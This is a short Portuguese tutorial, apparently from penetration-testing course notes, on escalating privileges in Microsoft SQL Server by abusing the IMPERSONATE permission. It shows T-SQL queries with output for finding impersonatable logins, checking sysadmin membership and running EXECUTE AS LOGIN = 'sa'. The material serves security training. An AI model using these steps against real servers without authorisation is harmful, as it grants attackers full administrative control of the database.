# Personificar usuários existentes com MSSQL

O SQL Server possui uma permissão especial, chamada `IMPERSONATE`, que permite ao usuário em execução obter as permissões de outro usuário ou fazer login até que o contexto seja redefinido ou a sessão termine. Vamos explorar como o `IMPERSONATE`privilégio pode levar ao escalonamento de privilégios no SQL Server.

Primeiro, precisamos identificar os usuários que podemos representar. Os administradores de sistemas podem representar qualquer pessoa por padrão, mas para usuários não administradores, os privilégios devem ser atribuídos explicitamente. Podemos usar a seguinte consulta para identificar usuários que podemos representar:

## Identifique os usuários que podemos personificar

```shell
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Para ter uma ideia das possibilidades de escalonamento de privilégios, vamos verificar se nosso usuário atual tem a função sysadmin:

## Verificando nosso usuário e função atuais

```shell
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Como o valor retornado indica `0`, não temos a função sysadmin, mas podemos representar o usuário `sa`. Vamos personificar o usuário e executar os mesmos comandos. Para personificar um usuário, podemos usar a instrução Transact-SQL `EXECUTE AS LOGIN` e configurá-la para o usuário que queremos representar.

## Representando o usuário SA

```shell
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

>**Nota:** É recomendado executar `EXECUTE AS LOGIN` dentro do banco de dados master, pois todos os usuários, por padrão, têm acesso a esse banco de dados. Se um usuário que você está tentando representar não tiver acesso ao banco de dados ao qual você está se conectando, ele apresentará um erro. Tente passar para o banco de dados mestre usando `USE master`.

Agora podemos executar qualquer comando como administrador de sistema, conforme indica o valor retornado `1`. Para reverter a operação e retornar ao nosso usuário anterior, podemos usar a instrução Transact-SQL `REVERT`.

>**Nota:** Se encontrarmos um usuário que não seja sysadmin, ainda poderemos verificar se o usuário tem acesso a outros bancos de dados ou servidores vinculados.


















